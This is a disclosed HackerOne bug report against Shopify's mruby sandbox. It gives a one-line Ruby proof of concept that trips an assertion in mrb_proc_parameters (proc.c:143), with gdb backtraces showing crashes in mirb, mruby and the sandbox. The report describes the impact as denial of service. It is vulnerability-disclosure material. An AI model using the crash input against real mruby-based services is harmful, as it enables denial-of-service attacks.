# Aborted - proc.c - line:143

## Report Details
- **Report ID**: 199764
- **URL**: https://hackerone.com/reports/199764
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-19T22:31:45.151Z
- **Disclosed**: 2017-03-09T01:24:48.039Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_proc_143.rb):

	l([[]],Proc.new{|b,|}.parameters)

mirb
-------------------

	x@x:~/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin$ ./mirb test_proc_143 
	mirb - Embeddable Interactive Ruby Shell

	mirb: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.
	Aborted (core dumped)

mirb - Debug
--------------------

	(gdb) r test_proc_143 
	Starting program: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin/mirb test_proc_143
	mirb - Embeddable Interactive Ruby Shell

	mirb: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 "%s%s%s:%u: %s%sAssertion `%s' failed.\n%n", assertion=assertion@entry=0x4b57c9 "i < (irep->nlocals-1)", 
		file=file@entry=0x4b5818 "/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c", line=line@entry=143, function=function@entry=0x4b5880 <__PRETTY_FUNCTION__.4653> "mrb_proc_parameters")
		at assert.c:92
	#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=assertion@entry=0x4b57c9 "i < (irep->nlocals-1)", file=file@entry=0x4b5818 "/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c", 
		line=line@entry=143, function=function@entry=0x4b5880 <__PRETTY_FUNCTION__.4653> "mrb_proc_parameters") at assert.c:101
	#4  0x000000000045b896 in mrb_proc_parameters (mrb=0x6ce010, self=...) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143
	#5  0x0000000000408603 in mrb_vm_exec (mrb=mrb@entry=0x6ce010, proc=<optimized out>, proc@entry=0x6d5cc0, pc=0x72daa8) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1174
	#6  0x000000000040eb9c in mrb_vm_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5cc0, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	#7  0x0000000000402e09 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

mruby
--------------------

	x@x:~/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin$ ./mruby test_proc_143 
	mruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.
	Aborted (core dumped)

mruby - Debug
--------------------
	
	(gdb) r test_proc_143 
	Starting program: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin/mruby test_proc_143
	mruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 "%s%s%s:%u: %s%sAssertion `%s' failed.\n%n", assertion=assertion@entry=0x4b4fc9 "i < (irep->nlocals-1)", 
		file=file@entry=0x4b5018 "/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c", line=line@entry=143, function=function@entry=0x4b5080 <__PRETTY_FUNCTION__.4653> "mrb_proc_parameters")
		at assert.c:92
	#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=assertion@entry=0x4b4fc9 "i < (irep->nlocals-1)", file=file@entry=0x4b5018 "/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c", 
		line=line@entry=143, function=function@entry=0x4b5080 <__PRETTY_FUNCTION__.4653> "mrb_proc_parameters") at assert.c:101
	#4  0x000000000045b0b6 in mrb_proc_parameters (mrb=0x6ce010, self=...) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143
	#5  0x0000000000408a23 in mrb_vm_exec (mrb=mrb@entry=0x6ce010, proc=<optimized out>, proc@entry=0x6d5c90, pc=0x72daa8) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1174
	#6  0x000000000040efbc in mrb_vm_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5c90, self=..., self@entry=..., stack_keep=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	#7  0x000000000040f2b6 in mrb_top_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5c90, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2490
	#8  0x000000000043fa51 in mrb_load_exec (mrb=mrb@entry=0x6ce010, p=<optimized out>, c=c@entry=0x70b260) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#9  0x000000000044161f in mrb_load_file_cxt (mrb=mrb@entry=0x6ce010, f=<optimized out>, c=c@entry=0x70b260) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/parse.y:5764
	#10 0x00000000004026d3 in main (argc=<optimized out>, argv=0x7fffffffe018) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232

sandbox
--------------------

	x@x:~/Desktop/test/mruby-engine/bin$ ./sandbox test_proc_143 
	ruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.
	Aborted (core dumped)

Impact
--------------------

It can cause DoS.

## Attachments
- test_proc_143.rb
